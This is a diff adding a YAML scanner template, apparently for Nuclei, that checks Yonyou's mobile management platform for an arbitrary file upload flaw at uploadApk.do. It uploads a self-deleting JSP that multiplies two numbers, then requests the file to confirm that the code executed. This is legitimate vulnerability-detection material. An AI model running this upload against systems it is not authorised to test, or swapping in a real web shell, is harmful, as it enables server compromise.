@@ -1,0 +1,45 @@
+id: yonyou-mobile-uploadapk-fileupload
+info:
+  name: 用友 移动系统管理平台 uploadapk 接口 - 任意文件上传漏洞
+  author: chaitin
+  severity: high
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/用友OA/用友%20移动管理系统%20uploadApk.do%20任意文件上传漏洞.md
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: yonyou
+    product: mobile
+  tags: file-upload,vuln,yonyou
+variables:
+  rfilename: '{{to_lower(rand_text_alpha(4))}}'
+  s1: '{{rand_int(40000, 44800)}}'
+  s2: '{{rand_int(40000, 44800)}}'
+  rboundary: '{{to_lower(rand_text_alpha(8))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/maportal/appmanager/uploadApk.do?pk_obj='
+    redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="downloadpath"; filename="{{rfilename}}.jsp"
+      Content-Type: application/msword
+
+      <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, ''"status":2'')'
+  - method: GET
+    path:
+      - '{{BaseURL}}/maupload/apk/{{rfilename}}.jsp'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, to_string(s1 * s2))'
